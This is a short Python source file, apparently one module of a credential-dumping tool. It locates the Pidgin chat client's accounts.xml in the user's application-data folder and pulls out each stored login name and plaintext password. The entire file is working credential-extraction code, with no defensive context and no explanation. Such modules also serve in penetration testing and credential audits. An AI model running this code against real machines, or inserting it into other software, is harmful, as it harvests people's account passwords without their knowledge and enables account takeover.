'''
@Author: Daboluo
@Date: 2018-10-08 18:10:08
@LastEditTime: 2020-06-16 11:00:32
@LastEditors: Do not edit
'''
# -*- coding: utf-8 -*-
import os
from xml.etree.cElementTree import ElementTree

from xdsmoc.config.constant import constant
from xdsmoc.config.module_info import ModuleInfo


class Pidgin(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'pidgin', 'chats')

    def run(self):
        path = os.path.join(
            constant.profile['APPDATA'], u'.purple', u'accounts.xml')
        if os.path.exists(path):
            tree = ElementTree(file=path)
            root = tree.getroot()
            pwd_found = []

            for account in root.findall('account'):
                name = account.find('name')
                password = account.find('password')
                # fix python3 bug
                if all((name.text, password.text)):
                    pwd_found.append({
                        'Login': name.text,
                        'Password': password.text
                    })
            return pwd_found
